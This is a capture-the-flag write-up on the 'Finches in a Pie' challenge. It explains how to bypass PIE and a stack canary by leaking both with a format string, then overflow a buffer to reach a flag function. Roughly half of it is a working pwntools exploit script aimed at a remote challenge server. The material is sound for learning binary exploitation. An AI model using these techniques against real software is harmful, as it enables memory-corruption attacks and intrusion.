# Finches in a Pie

Very similar to FIAS, so I won't explain the parts about a stack canary.

This time, there's PIE.

What changes? What changes is that the address of our ever-so-important flag function changes every time, as PIE randomises the base of the binary.

What we need to do is leak a value on the stack that we can calculate the binary base from.

We're in luck. When a function is called, the address of the instruction for it to ret to is placed on the top of the stack.

This means if the value isn't later overwritten, the addresses of some instructions, including instructions of functions of the binary, will remain on the stack.

Thus we can leak an instruction of a function in the binary, and calculate the base off of this.

I chose stack item 3, the address of the instruction in say\_hi after it calls the pc\_get\_thunk function. Our exploit:

Leak canary and binary base in one go with format string Send junk + canary + junk + flag address Script below:

```python
from pwn import *
import re
e = ELF("./fiap")
#p = e.process()
p = remote('95.216.233.106',22951)
p.clean()
leak = "%3$p.%11$p"
p.sendline(leak)
output = p.recvline().decode()
leaks = re.findall("Thank you, (.*)!", output)[0].split('.')
leaks = list(map(lambda x: int(x,16), leaks)) 
e.address = leaks[0] -  0x0000128f
canary = leaks[1]
log.info(f"Binary base: {hex(e.address)}")
log.info(f"Canary: {hex(canary)}")
padding = b'A' * 25
payload = flat(padding, canary, b'A' * 12, e.symbols['flag'])
p.sendline(payload)
p.interactive()
```

